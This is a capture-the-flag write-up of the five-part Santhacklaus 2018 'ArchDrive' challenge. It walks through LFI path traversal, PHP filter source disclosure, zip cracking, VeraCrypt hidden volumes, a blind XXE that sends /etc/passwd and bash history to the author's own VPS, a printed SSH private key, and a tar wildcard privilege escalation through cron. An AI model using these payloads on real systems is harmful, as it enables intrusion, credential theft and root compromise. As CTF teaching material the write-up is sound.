---
weight: 4
title:  "[Santhacklaus 2018] - ArchDrive"
date: 2018-12-19T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["santhacklaus", "pinkflood", "pentest", "web", "lfi", "sudo", "tar", "xxe"]
categories: ["Writeups"]

lightgallery: true
---

## ArchDrive 1/3

### Statement


![](/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive1.png)


### State of the art

This comes with a really good looking website:


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive1_1.png)


I notice a strange GET parameter when clicking on `Reset it`:

> https://archdrive.santhacklaus.xyz/?page=reset.php

### Basic local file inclusion

I tried to include `/etc/passwd` file:

> https://archdrive.santhacklaus.xyz/?page=../../../../../../../../../etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
G0lD3N_Us3r:x:1000:1000:IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r},,,:/home/G0lD3N_Us3r:/bin/bash
```

w00t!

### Flag

> IMTLD{Th1s_iS_4n_ImP0rt4nT_uS3r}

## ArchDrive 2/3

### Statement


![](/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive2.png)


### State of the art

Ok, we got a __Local file inclusion__, let's try to use the base64 php wrapper (go on payload all the things):

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=reset.php

It gives me some base64 data, here is the decoded data:

```php
<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Reset Your Password</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<link rel="stylesheet" type="text/css" href="css/util.css">
<link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
<div class="limiter">
    <div class="container-login100">
        <div class="wrap-login100">
            <form class="login100-form validate-form" method="post" action="?page=reset.php">
<span class="login100-form-title p-b-48">
<a href="index.php"><img class="logo-brand" src="images/archdrive-color.png" alt="ArchDrive logo"></a>
</span>
<span class="login100-form-title p-b-26">
ArchDrive
</span>
<p class="login100-form-title" style="font-size: 24px">Reset My Password</p></br>

<?php
    if(isset($_POST['recover']))
    {
    ?>
<p>Email sent !</p>
<?php
    }
    ?>


<div class="wrap-input100 validate-input" data-validate = "Valid email is: a@b.c">
<input class="input100" type="text" name="email">
<span class="focus-input100" data-placeholder="Email (only from @archdrive.corp)"></span>
</div>

<div class="container-login100-form-btn">
<div class="wrap-login100-form-btn">
<div class="login100-form-bgbtn"></div>
<button class="login100-form-btn" name="recover">Recover Password</button>
</div>
</div>
</form>
</div>
</div>
</div>


<div id="dropDownSelect1"></div>

<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<script src="vendor/animsition/js/animsition.min.js"></script>
<script src="vendor/bootstrap/js/popper.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/select2/select2.min.js"></script>
<script src="vendor/daterangepicker/moment.min.js"></script>
<script src="vendor/daterangepicker/daterangepicker.js"></script>
<script src="vendor/countdowntime/countdowntime.js"></script>
<script src="js/main.js"></script>

</body>
</html>
```

### Local file inclusion

The __index.php__ file doesn't work, I didn't succeed to extracted it. Nevermind, there is a __login.php__ file, found in the index form:


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive2_1.png)


Then:

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=login.php

```php
<?php
  session_start();

  $state = new \stdClass();

  if ( isset($_POST['email']) && !empty($_POST['email']) ) {
    if ( isset($_POST['pass']) && !empty($_POST['pass']) ) {

      $bdd = mysqli_connect('database:3306', 'archdrive-corpo-bdd-admin', '8mkxdcwwyvtk36snF2b4TcEqSjh4Cc', 'ctf-archdrive-corp');
      if (mysqli_connect_errno()) {
          $state->return = 'error';
          $state->string = 'Connection error';
          $state_json = json_encode($state);
          echo $state_json;
          return;
      }

      $user = mysqli_real_escape_string($bdd, strtolower($_POST['email']));
      $pass = $_POST['pass'];
$sql = "SELECT user,password FROM `access-users` WHERE user='".$user."' AND password='".$pass."'";

      $res = mysqli_query($bdd, $sql);

      $num_row = mysqli_num_rows($res);
      $row=mysqli_fetch_assoc($res);

        if ( $num_row == 1 && $user === $row['user']) {
            $state->return = 'true';
            $_SESSION['logged'] = 1;
            header("Location: myfiles.php");

      } else {
          $state->return = 'false';
          header("Location: index.php");
      }
    }
  }
?>
```

Great, new file appeared: __myfiles.php__

> https://archdrive.santhacklaus.xyz/?page=pHp://FilTer/convert.base64-encode/resource=myfiles.php

```php
<?php session_start();

    if($_SESSION['logged'] === 1)
    {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>My Files</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
  <link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
  <link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
  <link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
  <link rel="stylesheet" type="text/css" href="css/util.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body>
  <div class="limiter">
    <div class="container-login100">
      <div class="wrap-login100">
          <span class="login100-form-title p-b-48">
            <a href="index.php"><img class="logo-brand" src="images/archdrive-color.png" alt="ArchDrive logo"></a>
          </span>
          <span class="login100-form-title p-b-26">
            ArchDrive
          </span>

    <p class="login100-form-title" style="font-size: 24px">My Recent Documents</p></br>
            <ul>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/rib-bnp.gif">rib-bnp.gif</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/test.html">test.html</a></li>
            <li><a class="txt2" href="images/vacances1.jpg">Vacances_2018_1.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip">CONFIDENTIEL.zip</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png">facture_mobile_sfr.png</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/camel.jpg">camel.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/cat.jpg">cat.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/documents">documents</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/funny_wtf.jpg">funny_wtf.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/freshandhappy.mp3">freshandhappy.mp3</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/intense.mp3">intense.mp3</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/recup.zip">recup.zip</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/funny.jpg">funny.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/goats.jpg">goats.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/lol.jpg">lol.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/rapport_SM.pdf">rapport_SM.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/media">media</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/these.pdf">these.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/these-2.pdf">these-2.pdf</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/wallpaper.jpg">wallpaper.jpg</a></li>
            <li><a class="txt2" href="21f64da1e5792c8295b964d159a14491/VeraCrypt.zip">VeraCrypt.zip</a></li>
            </ul>

<div class="text-center p-t-115">
<form method="post" action="logout.php">
<button class="txt2" value="disconnect">
Log out.
</button>
</form>
</div>

      </div>
    </div>
  </div>


  <div id="dropDownSelect1"></div>

  <script src="vendor/jquery/jquery-3.2.1.min.js"></script>
  <script src="vendor/animsition/js/animsition.min.js"></script>
  <script src="vendor/bootstrap/js/popper.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
  <script src="vendor/select2/select2.min.js"></script>
  <script src="vendor/daterangepicker/moment.min.js"></script>
  <script src="vendor/daterangepicker/daterangepicker.js"></script>
  <script src="vendor/countdowntime/countdowntime.js"></script>
  <script src="js/main.js"></script>

</body>
</html>
<?php
    }
    else
    {
        include('error.php');
    }
?>
```

### File extraction

Ok, now I think I'm seeing files stored in the drive, I made a little script to extract them:

```python
#!/usr/bin/python2

import requests
import base64

file_list = ['21f64da1e5792c8295b964d159a14491/rib-bnp.gif', '21f64da1e5792c8295b964d159a14491/test.html', 'images/vacances1.jpg', '21f64da1e5792c8295b964d159a14491/CONFIDENTIEL.zip', '21f64da1e5792c8295b964d159a14491/facture_mobile_sfr.png', '21f64da1e5792c8295b964d159a14491/camel.jpg', '21f64da1e5792c8295b964d159a14491/cat.jpg', '21f64da1e5792c8295b964d159a14491/funny_wtf.jpg', '21f64da1e5792c8295b964d159a14491/freshandhappy.mp3', '21f64da1e5792c8295b964d159a14491/intense.mp3', '21f64da1e5792c8295b964d159a14491/recup.zip', '21f64da1e5792c8295b964d159a14491/funny.jpg', '21f64da1e5792c8295b964d159a14491/goats.jpg', '21f64da1e5792c8295b964d159a14491/lol.jpg', '21f64da1e5792c8295b964d159a14491/rapport_SM.pdf', '21f64da1e5792c8295b964d159a14491/these.pdf', '21f64da1e5792c8295b964d159a14491/these-2.pdf', '21f64da1e5792c8295b964d159a14491/wallpaper.jpg', '21f64da1e5792c8295b964d159a14491/VeraCrypt.zip','21f64da1e5792c8295b964d159a14491/media','21f64da1e5792c8295b964d159a14491/documents']

for i in file_list:
  r = requests.get("https://archdrive.santhacklaus.xyz/index.php?page=pHp://FilTer/convert.base64-encode/resource="+str(i))
  data = base64.b64decode(r.text.split('\r\n')[-1].replace(' ',''))

  filename = i.replace('/','_')
  print("[+] Result written in: {0}".format(filename))
  f = open(filename, 'wb')
  f.write(data)
  f.close()
```

The __CONFIDENTIEL.zip__ contains garbage, nothing usefull. But the __recup.zip__ is encrypted! 

### Bruteforce time

I got an encrypted zip file, I got a wordlist, let's call fcrackzip:

```bash
$ fcrackzip -v -D -u -p /home/maki/Tools/wordlist/rockyou.txt 21f64da1e5792c8295b964d159a14491_recup.zip
found file 'password.txt', (size cp/uc    271/   377, flags 9, chk 5aec)


PASSWORD FOUND!!!!: pw == hackerman

$ unzip 21f64da1e5792c8295b964d159a14491_recup.zip
Archive:  21f64da1e5792c8295b964d159a14491_recup.zip
[21f64da1e5792c8295b964d159a14491_recup.zip] password.txt password: hackerman
  inflating: password.txt

$ cat password.txt
=== FLAG ===

IMTLD{F1nd_Y0uR_W4y}

==== Facebook ===

P@ssw0rd123

=== Twitter ===

azertY#!?$

=== Job ===

Door: 5846
Computer: 0112#aqzsed

=== zip ===

ohm0-9Quirk
Finny5-polo2-Rule

=== VC ===

7Rex-Mazda0-hover1-Quid
Gourd-crown2-gao4-warp2 - Take On Me
0twain-Mao0-flash-6Goof-Gent

=== Portable ===

Windobe123

=== iPhone ===

123789
```

### Flag

> IMTLD{F1nd_Y0uR_W4y}

## ArchDrive 3/3

### Statement


![](/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive3.png)


### State of the art

According to the previous part, here is what we got:

* There is something to do with Veracrypt
* Veracrypt container hasn't got magic number (documents and media could be containers)
* password.txt contains __VC password__ (VC -> Veracrypt)

### Decrypting and mounting

There are 3 keys:

* 7Rex-Mazda0-hover1-Quid
* Gourd-crown2-gao4-warp2 - Take On Me
* 0twain-Mao0-flash-6Goof-Gent


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_1.png)


* documents -> 0twain-Mao0-flash-6Goof-Gent
* media -> 7Rex-Mazda0-hover1-Quid

A little tip about forensic, when you're mounting something: Make a copy of your volume, and work and that copy, it will prevent all unannounced change.

```bash
$ lsblk
NAME             MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT
loop0              7:0    0    10M  0 loop  
└─veracrypt1     254:4    0   9,8M  0 dm    /mnt/veracrypt1
loop1              7:1    0    30M  0 loop  
└─veracrypt2     254:5    0  29,8M  0 dm    /mnt/veracrypt2

$ sudo dd if=/dev/mapper/veracrypt1 of=clear_document.dmp bs=4M
$ sudo dd if=/dev/mapper/veracrypt2 of=clear_media.dmp bs=4M
```

After copying, I'm using `testdisk` to browse into.

```bash
$ sudo testdisk /path/to/document.dmp 
Proceed -> None -> Advanced -> Undelete
```


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_2.png)



![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_3.png)


Using `testdisk` allows me to find erased files. The MP3 in `documents` containers is not really helpful.

### Hidden volume

I remind me something, when I tried to learn how veracrypt work: hidden volume.

> https://www.veracrypt.fr/en/Hidden%20Volume.html

There is one more key in the `password.txt` file:

> Gourd-crown2-gao4-warp2 - Take On Me

And in the `media` container, there is a MP3 file called: 

> -rwxr-xr-x     0     0   7080168 19-Dec-2018 10:28 a.ha_-\_TakeOnMe.mp3

Let's try to decrypt the `media` container with the given key and the MP3 as keyfiles:

```bash
$ cp clear_media.dmp hidden_media.dmp 
```


![](https://media.giphy.com/media/l3q2GZaeJ4v24D7P2/giphy.gif)


WTF, it worked! You're really crazy guys, first time seeing this in a CTF! :D

```bash
$ sudo dd if=/dev/mapper/veracrypt3 of=clear_media_hidden.dmp bs=4M

$ sudo testdisk clear_media_hidden.dmp 
```


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive3_4.png)


### Flag

In `FLAG.TXT`:

> IMTLD{I_h4v3_N0th1ng_T0_h1d3}

## ArchDrive 4/3



| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive&nbsp;4/3       | Web         |   700    | 8     |



### Statement


![](/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive4.png)


### State of the art

After recovering the erased zip archive in the hidden container, we obtain two files:

* README.md
* ticket.xml

```bash
$ unzip Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip 
Archive:  Dark_Lottery_ticket_d2e383e8600daf6dc31c2436aefd3f58.zip
  inflating: ticket.xml              
  inflating: README.md

$ cat README.md
### This ticket is the property of `Dark Lottery` ###
If you are not the buyer and if you found / stole this ticket, you must delete it immediately.
This ticket is unique, do not share it.
Remember to use it at your own risk.

Thank you for your purchase !

--- scgz54b2lftqkkvn.onion ---

$ cat ticket.xml                      
<ticket>
    <number>14453</number>
    <status>valid</status>
    <date>20/12/2018</date>
    <type>premium</date>
</ticket>
```

### Tor browsing (BUYING DRUGS)

What happens on this onion website:


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_1.png)


It's impossible to buy ticket, it's SOLD OUT :'(
But if you got one, you can play:


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_2.png)


Ooooook, our ticket doesn't work. Here is what we got:

* XML file
* Upload form
* Same output

It looks to be a blind XXE, or XXE OOB (Out of band): https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

### XXE OOB

I will not use `ngrok` trick, because I got my VPS now. Before starting, __ironforge__ is my VPS and __miniverse__ is my laptop.

I craft a new ticket:

```bash
miniverse $ cat ticket.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE number [ <!ENTITY % pe SYSTEM "http://51.75.29.170:12345/bite.dtd"> %pe; %param1; ]>
<ticket>
    <number>&external;</number>
    <status>valid</status>
    <date>20/12/2018</date>
    <type>premium</date>
</ticket>
```

The IP address is my VPS (where https://ctf.maki.bzh is hosted). This XML code, will grab the dtd file on my VPS, then:

```bash
ironforge $ cat bite.dtd
<!ENTITY % stuff SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'>">
```

The first XML will grab `bite.dtd` file, which send the content of `/etc/passwd` (base64 encoded) on the port __12346__ of my VPS:


![](/lib/images/writeups/2018_santhacklaus/archdrive/archdrive4_3.gif)


It works!

### File extraction

In the `/etc/passwd` file, only one user got `/bin/bash` shell: __root__, what does it contain?

```bash
ironforge $ cat bite.dtd
<!ENTITY % stuff SYSTEM "php://filter/convert.base64-encode/resource=/root/.bash_history">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://51.75.29.170:12346/a.php?data=%stuff;'>">

ironforge $ nc -lvp 12346
Listening on [0.0.0.0] (family 0, port 12346)
Connection from 113.ip-51-75-202.eu 49966 received!
GET /a.php?data=bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK HTTP/1.0
Host: 51.75.29.170:12346
Connection: close

ironforge $ echo -n 'bHMgLWxhIC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAKY2F0IC9ob21lL2RhcmtfbG90dGVyeS8uc3NoL2lkX3JzYSAK' | base64 -d
ls -la /home/dark_lottery/.ssh/id_rsa 
cat /home/dark_lottery/.ssh/id_rsa
```

### SSH connection

Ok, ssh keys, it start to smells good :D
Following the same process, I extract:

* /home/dark_lottery/.ssh/id_rsa
* /etc/ssh/sshd_config

> /home/dark_lottery/.ssh/id_rsa

```raw
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQC3e6s3ZeRV/lgTltFgmVLB/LBYtzRBSpQUEt/1g/MsMidRhdBw
W0kDlgchsVHL6kGt26JtHVr04MdFSeCUHiSJVuuqDiEPae+98l4LOWWg2dXwKsIv
x6qDobCyGNi7HzmkxNTh+NxLq+aIsjk/gw38HtNkZAqwokySDcZhgwHFawIDAQAB
AoGAQqB/vfAcCDYB2assgL1sVdDiYHS2Xvcr6lYoSUkO5n+X03yaAhLD4q96C3wO
TdPU4cMdqi28t6tf8QMwr9h6P1+M7CDTsyBQbR7bvm88yzGNBuE9P3oBiKu24+x0
lPL1TORpHxGOersUz3eH2+hdnGs3xDYNSk8RoUY6ckCv3AECQQDbdwhuvDo+cnkN
xupfdvSRTfXH05fosfvim6/yvw0ZeyxyAzXE5/KclpNCXzW70JrVI4huXjk5TD7l
R019nJprAkEA1gcw48pAjFSc6oTexR1ayHQYGFGSx7PvXi+VJHAyFTXP4+l+pk72
qFlrT4tYMiZqbCws9qAthpsTBnauspBBAQJBAMWOwn2EXV3niEc5n7NuDrxalHxc
YivrRFZ6VYnMJ8ufUKQVdaqaLZB+D3O451L5dteU0/SeRx7oHtogNIZ1mZ8CQAYp
mNfGOAuSWB5MixmD2dxRs2vn1WEYpjjBB/tPm7GOphi63WGufl2kjXlx2q0+++t3
bif/vq/UgTy7aBZOHwECQQC4jty8EX0KdvylXIRzhCK7XvHze+GXHFptaB1wf+Wr
LAKwqo3/gOiPe8w5CRUWuDfuy04a81OBEF3Gv2pyVctg
-----END RSA PRIVATE KEY-----
```

> /etc/ssh/sshd_config

```raw
### SSH configuration file ###

# General
Port 2020
Protocol 2
AcceptEnv LANG LC_*
[...]
```

We got a port and a private key :D

```bash
miniverse $ chmod 600 dark_lottery_priv.key
miniverse $ ssh -i dark_lottery_priv.key dark_lottery@51.75.202.113 -p 2020


    ___           _        __       _   _
   /   \__ _ _ __| | __   / /  ___ | |_| |_ ___ _ __ _   _
  / /\ / _` | '__| |/ /  / /  / _ \| __| __/ _ \ '__| | | |
 / /_// (_| | |  |   <  / /__| (_) | |_| ||  __/ |  | |_| |
/___,' \__,_|_|  |_|\_\ \____/\___/ \__|\__\___|_|   \__, |
                                                      |___/
Last login: Fri Dec 21 18:28:07 2018 from 77.206.71.218

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
dark_lottery@9db68003fdde:~$ ls
flag.txt
```

### Flag

> IMTLD{Wh4t_4_H4rD_ch4lL3nge}

## ArchDrive 5/3



| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | ArchDrive&nbsp;5/3       | App-script         |   300    | 8     |



### Statement


![](/lib/images/writeups/2018_santhacklaus/archdrive/statement_archdrive5.png)


### State of the art

Let's privesc. As I said in NetRunner 3/3, there are few ways to privesc:

* sudo misconfigured
* crontab or services running as privileged user
* suid binary or script to exploit

```bash
$ sudo -l
-bash: sudo: command not found

$ ps aux| grep root
root         1  0.0  0.0  19708  3200 ?        Ss   Dec21   0:00 /bin/bash ./start.sh
root         8  0.0  0.0  69952  5756 ?        S    Dec21   0:00 /usr/sbin/sshd -D
root         9  0.0  0.0  29740  2808 ?        S    Dec21   0:00 cron -f
root        97  0.0  0.0  19952  3656 pts/2    Ss+  Dec21   0:00 bash
root     13454  0.0  0.0  69952  6504 ?        Ss   12:20   0:00 sshd: dark_lottery [priv]
dark_lo+ 13539  0.0  0.0  11112   988 pts/0    S+   12:26   0:00 grep root
```

Crontab as root, nice, let's find the cron script:

```bash
$ ls -la /
total 84
drwxr-xr-x   1 root root 4096 Dec 21 18:26 .
drwxr-xr-x   1 root root 4096 Dec 21 18:26 ..
-rwxr-xr-x   1 root root    0 Dec 21 18:26 .dockerenv
-rwxrwxr--   1 root root  147 Dec 20 18:24 backup.sh
dr--r-----   1 root root 4096 Dec 22 12:27 backups
drwxr-xr-x   1 root root 4096 Dec 20 18:26 bin
drwxr-xr-x   2 root root 4096 Oct 20 10:40 boot
[...]
```

The `backup.sh` file is not a regular linux file :p

```bash
$ cat /backup.sh
#!/bin/sh

/bin/rm -rf /backups/*
cd /opt/src/ && /bin/tar -cvzf /backups/bck-src_`/bin/date +"%Y-%m-%d_%H%M"`.tar.gz *
/bin/chmod 440 -R /backups
```

Ok, the exploit is tar wildcard: https://thanat0s.trollprod.org/2014/07/et-hop-ca-root/

### Exploit

First, where is the flag:

```bash
$ ls -la /opt/src 
total 12
drwxrwxrwx 1 root root 4096 Dec 21 19:03 .
drwxr-xr-x 1 root root 4096 Dec 20 18:27 ..
-r--r----- 1 root root   26 Dec 20 18:24 .flag.txt
```

Second, exploit time :D

```bash
$ touch -- '--checkpoint-action=exec=sh install_suidbackdoor.sh' '--checkpoint=1'
$ echo 'cp /opt/src/.flag.txt /tmp/flag_maki' > install_suidbackdoor.sh
$ echo 'chmod 777 /tmp/flag_maki' >> install_suidbackdoor.sh
```

After a minute: 

```bash
$ ls -la /tmp/flag_maki
-rwxrwxrwx 1 root root 26 Dec 22 12:32 /tmp/flag_maki
```

### Flag

> IMTLD{R04d_T0_Th3_sW1tCH}